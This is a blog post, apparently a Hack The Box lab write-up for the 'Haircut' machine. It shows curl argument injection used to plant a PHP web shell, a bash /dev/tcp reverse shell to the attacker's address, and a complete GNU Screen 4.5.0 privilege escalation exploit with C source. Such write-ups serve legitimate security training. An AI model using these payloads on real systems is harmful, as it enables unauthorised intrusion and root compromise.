@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB: Haircut :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Haircut - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/haircut/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB: Haircut">
+<meta property="og:description" content="**HTB | Haircut - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/haircut/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Haircut.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-16 11:17:34 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/haircut/">HTB: Haircut</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-16
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ssrf/">SSRF</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/curl/">curl</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/gnu_screen/">GNU_Screen</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Haircut.png"
+    class="post-cover"
+    alt="HTB: Haircut"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Haircut</strong> starts with web enumeration where we will find a PHP site executing curl.</p>
+<p>We will use parameter injection to get a webshell and command execution.</p>
+<p>For root we will exploit a vulnerable versino of screen.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Nmap finds two open ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.95.174 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-16 11:11 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 11:11
+</span></span><span style="display:flex;"><span>Scanning 10.129.95.174 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.129.95.174
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.95.174
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 11:11, 16.14s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.174
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.32 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">79153</span> <span style="color:#f92672">(</span>3.483MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">79075</span> <span style="color:#f92672">(</span>3.163MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>With parameters <strong>-sCV</strong> we can find the service and version running for each port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p22,80 10.129.95.174 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-16 11:13 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.174
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.10.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title:  HTB Hairdresser
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.10.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.61 seconds
+</span></span></code></pre></div><h1 id="http-server">HTTP server<a href="#http-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We don&rsquo;t have creds for SSH so let&rsquo;s take a look to the webserver:</p>
+
+  <img src="/img/hai1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>There isn&rsquo;t anything going on here so let&rsquo;s fuzz:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.95.174/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.129.95.174/FUZZ
+</span></span><span style="display:flex;"><span>Total requests: 220547
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000151:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">7</span> L      <span style="color:#ae81ff">13</span> W       <span style="color:#ae81ff">194</span> Ch      <span style="color:#e6db74">&#34;uploads&#34;</span>
+</span></span></code></pre></div><p>There&rsquo;s an <strong>/uploads</strong> route but we get a <em>403 Forbidden</em>. We can also fuzz for PHP files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.95.174/FUZZ.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.129.95.174/FUZZ.php
+</span></span><span style="display:flex;"><span>Total requests: 220547
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000025044:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">19</span> L     <span style="color:#ae81ff">41</span> W       <span style="color:#ae81ff">446</span> Ch      <span style="color:#e6db74">&#34;exposed&#34;</span>
+</span></span></code></pre></div><p><em>exposed.php</em> exists:</p>
+
+  <img src="/img/hai3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It looks like it&rsquo;s executing curl because of the verbose we see, if we were to put <strong>-s</strong> parameter we should not see it anymore:</p>
+
+  <img src="/img/hai2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now let&rsquo;s try some injections to breakout from the command:</p>
+
+  <img src="/img/hai4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The input is sanitized so we cannot execute commands along the curl, but we previously saw that we can use curl parameters like -s.</p>
+<h1 id="writting-webshell">Writting webshell<a href="#writting-webshell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We can take advantage of this with the <em>-o</em> parameter of curl, which allow us to write the output to a file. We can try to write files to the <strong>/uploads</strong> route we found previously.</p>
+<p>I will test this by trying to write a <strong>test.txt</strong> to <strong>/var/www/html/uploads/</strong>:</p>
+<pre tabindex="0"><code>http://10.10.14.161/test.txt -o /var/www/html/uploads/test.txt
+</code></pre>
+  <img src="/img/hai5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It works! As the website works interpretes PHP we can upload a web shell in PHP and get command execution:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h1 id="executing-commands">Executing commands<a href="#executing-commands" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This script will request the parameter <strong>cmd</strong> as the command to execute:</p>
+
+  <img src="/img/hai6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Perfect, now we can get a reverse shell with bash with this payload:</p>
+<pre tabindex="0"><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.161/334 0&gt;&amp;1&#39;
+</code></pre><p>As we are going to send this over the URL we have to url-encode the <em>&amp;</em> as %26:</p>
+
+  <img src="/img/hai7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.95.174.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.95.174:44958.
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1253<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@haircut:~/html/uploads$
+</span></span></code></pre></div><p>Nice, now let&rsquo;s turn this shell into an interactive tty:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@haircut:~/html/uploads$ script /dev/null -c bash
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>Script started, file is /dev/null
+</span></span><span style="display:flex;"><span>www-data@haircut:~/html/uploads$ ^Z
+</span></span><span style="display:flex;"><span>zsh: suspended  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ stty raw -echo; fg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>                              reset xterm
+</span></span></code></pre></div><p>And finally set the terminal and shell type and the screen size:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@haircut:~/html/uploads$ export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>www-data@haircut:~/html/uploads$ export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>www-data@haircut:~/html/uploads$ stty rows <span style="color:#ae81ff">40</span> columns <span style="color:#ae81ff">145</span>
+</span></span></code></pre></div><p>Now we can see the user.txt inside maria&rsquo;s home directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@haircut:/home/maria$ cat user.txt
+</span></span><span style="display:flex;"><span>dad423ad0da3c*******************
+</span></span></code></pre></div><h1 id="privesc"><strong><code>Privesc</code></strong><a href="#privesc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I will start by enumerating the SUID binaries inside the system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@haircut:/$ find <span style="color:#ae81ff">\-</span>perm -4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>./bin/ntfs-3g
+</span></span><span style="display:flex;"><span>./bin/ping6
+</span></span><span style="display:flex;"><span>./bin/fusermount
+</span></span><span style="display:flex;"><span>./bin/su
+</span></span><span style="display:flex;"><span>./bin/mount
+</span></span><span style="display:flex;"><span>./bin/ping
+</span></span><span style="display:flex;"><span>./bin/umount
+</span></span><span style="display:flex;"><span>./usr/bin/sudo
+</span></span><span style="display:flex;"><span>./usr/bin/pkexec
+</span></span><span style="display:flex;"><span>./usr/bin/newuidmap
+</span></span><span style="display:flex;"><span>./usr/bin/newgrp
+</span></span><span style="display:flex;"><span>./usr/bin/newgidmap
+</span></span><span style="display:flex;"><span>./usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>./usr/bin/at
+</span></span><span style="display:flex;"><span>./usr/bin/passwd
+</span></span><span style="display:flex;"><span>./usr/bin/screen-4.5.0
+</span></span><span style="display:flex;"><span>./usr/bin/chsh
+</span></span><span style="display:flex;"><span>./usr/bin/chfn
+</span></span><span style="display:flex;"><span>./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span style="display:flex;"><span>./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>./usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>./usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>./usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>./usr/lib/policykit-1/polkit-agent-helper-1
+</span></span></code></pre></div><h1 id="exploiting-screen-vulnerable-version">Exploiting screen vulnerable version<a href="#exploiting-screen-vulnerable-version" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>If you have some experience doing machines you will see that <strong>screen-4.5.0</strong> is not a common binary to see, so this calls my attention.</p>
+<p>In <strong>searchsploit</strong> we find an exploit for this version:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ searchsploit screen 4.5.0
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                 |  Path
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>GNU Screen 4.5.0 - Local Privilege Escalation                                                                  | linux/local/41154.sh
+</span></span><span style="display:flex;"><span>GNU Screen 4.5.0 - Local Privilege Escalation <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span>                                                            | linux/local/41152.txt
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>However we will need to do some modifications and compile it locally for it to work.</p>
+<p>First we have to create a file <strong>libhax.c</strong> and compile it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat <span style="color:#e6db74">&lt;&lt; EOF &gt; libhax.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;sys/types.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;unistd.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__attribute__ ((__constructor__))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">void dropshell(void){
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    chown(&#34;/tmp/rootshell&#34;, 0, 0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    chmod(&#34;/tmp/rootshell&#34;, 04755);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    unlink(&#34;/etc/ld.so.preload&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    printf(&#34;[+] done!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -fPIC -shared -ldl -o libhax.so libhax.c
+</span></span></code></pre></div><p>Next up a <strong>rootshell.c</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat <span style="color:#e6db74">&lt;&lt; EOF &gt; rootshell.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">int main(void){
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setuid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setgid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    seteuid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setegid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    execvp(&#34;/bin/sh&#34;, NULL, NULL);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o rootshell rootshell.c
+</span></span></code></pre></div><p>Now upload both compiled files to the victim machine and execute the rest of the commands inside the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@haircut:/tmp$ cd /etc/
+</span></span><span style="display:flex;"><span>www-data@haircut:/etc$ umask <span style="color:#ae81ff">000</span>
+</span></span><span style="display:flex;"><span>www-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  <span style="color:#e6db74">&#34;\x0a/tmp/libhax.so&#34;</span>
+</span></span><span style="display:flex;"><span>www-data@haircut:/etc$ screen -ls
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> from /etc/ld.so.preload cannot be preloaded <span style="color:#f92672">(</span>cannot open shared object file<span style="color:#f92672">)</span>: ignored.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#66d9ef">done</span>!
+</span></span><span style="display:flex;"><span>No Sockets found in /tmp/screens/S-www-data.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data@haircut:/etc$ /tmp/rootshell
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Amazing exploit, now we can see the root flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># cat /root/root.txt
+</span></span><span style="display:flex;"><span>4fd23927c29c4*******************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://theloganlab.github.io/posts/lazy/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB: Lazy</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/nunchucks/">
+                <span class="button__text">HTB: Nunchucks</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
